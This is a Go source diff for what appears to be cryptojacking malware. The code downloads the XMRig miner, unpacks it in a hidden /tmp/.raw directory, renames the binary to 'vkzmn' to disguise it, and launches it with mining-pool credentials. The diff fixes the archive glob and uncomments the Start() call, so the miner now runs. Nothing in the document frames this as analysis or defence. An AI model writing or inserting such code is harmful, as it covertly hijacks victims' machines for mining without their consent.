@@ -41,6 +41,8 @@ tls :=  "--tls"
 
 
 
+
+
 config :=  fmt.Sprintf(   "%s %s %s %s %s" , url , user , pass , dl , tls)
 
 r ,  e    :=  http.NewRequest("GET" , "https://download.xmrig.com/xmrig/6.9.0/072881e1a1214befdd46f5823f4ba7afeb14136a/xmrig-6.9.0-linux-x64.tar.gz" , nil)
@@ -77,7 +79,7 @@ r ,  e    :=  http.NewRequest("GET" , "https://download.xmrig.com/xmrig/6.9.0/07
 
 
 
-  exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *raw ; cd *.0 ; rm config.json ; mv xmrig vkzmn ; ./vkzmn " + config )
+rrrr   :=    exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *.raw ; cd *.0 ; rm config.json ; mv xmrig vkzmn ; ./vkzmn " + config )
 
 
 
@@ -88,7 +90,7 @@ os.Truncate("/tmp/try_vkzmn" , 0)
 
  
 
-//rrrr.Start()
+rrrr.Start()
 
 
 
